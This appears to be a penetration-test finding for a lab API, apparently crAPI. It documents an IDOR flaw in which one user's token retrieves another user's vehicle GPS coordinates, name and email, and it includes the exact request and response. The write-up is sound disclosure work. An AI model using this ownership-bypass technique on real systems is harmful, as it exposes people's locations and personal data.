\# Findings



\## FINDING-01: BOLA/IDOR — Vehicle Location Endpoint Exposes Cross-User Data



\*\*Severity:\*\* HIGH  

\*\*Spec:\*\* `idor-vehicles.cy.js` — tests 4 and 5  

\*\*Endpoint:\*\* `GET /identity/api/v2/vehicle/{uuid}/location`  

\*\*Classification:\*\* OWASP A01 — Broken Access Control (BOLA/IDOR)



\### Description



The vehicle location endpoint does not enforce ownership boundaries. An authenticated user can supply another user's vehicle UUID and receive a 200 response containing the vehicle owner's name, email address, and GPS coordinates.



\### Reproduction



Authenticate as Bob. Request Alice's vehicle location using Alice's vehicle UUID with Bob's token:

GET /identity/api/v2/vehicle/e723d757-eaca-4830-b7a3-b1cc21a97fe2/location

Authorization: Bearer <bob\_token>

### Observed Response

HTTP 200 OK

{

"carId": "e723d757-eaca-4830-b7a3-b1cc21a97fe2",

"vehicleLocation": {

"id": 4,

"latitude": "38.206348",

"longitude": "-84.270172"

},

"fullName": "Alice",

"email": "alice@crapi.local"

}

### Expected Behavior



The endpoint should return 403 Forbidden when the requesting user does not own the vehicle identified by the UUID.



\### Impact



Any authenticated user can enumerate vehicle UUIDs and retrieve the real-time GPS location, full name, and email of any other user. This constitutes a complete ownership boundary failure on a user-identifying resource.

